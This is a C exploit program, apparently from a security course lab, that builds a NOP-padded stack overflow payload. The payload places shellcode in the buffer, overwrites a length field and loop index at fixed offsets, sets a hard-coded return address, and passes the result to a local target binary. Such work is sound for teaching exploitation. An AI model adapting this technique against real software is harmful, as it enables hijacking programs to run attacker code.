#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define NOP	0x90
#define LEN	200

int main(void)
{
	char *	args[3];
  	char *	env[1];
  	char	attack[LEN];
  
  	memset((void*)attack, NOP, LEN);
	
	memcpy((void*)attack, (void*)shellcode, sizeof shellcode - 1);

	char len[] = "\xff\x01\x01\x01";
	memcpy((void*)attack+168, (void*)len, sizeof len - 1);

	char i[] = "\xef\x01\x01\x01";
	memcpy((void*)attack+172, (void*)i, sizeof i - 1);

	char ret[] = "\xb0\xfd\x21\x20";
	memcpy((void*)attack+184, (void*)ret, sizeof ret);

  	args[0] = TARGET; 
	args[1] = attack; 
	args[2] = NULL;
  	
  	env[0] = NULL;

  	if (0 > execve(TARGET, args, env))
    		fprintf(stderr, "execve failed.\n");

  	return 0;
}
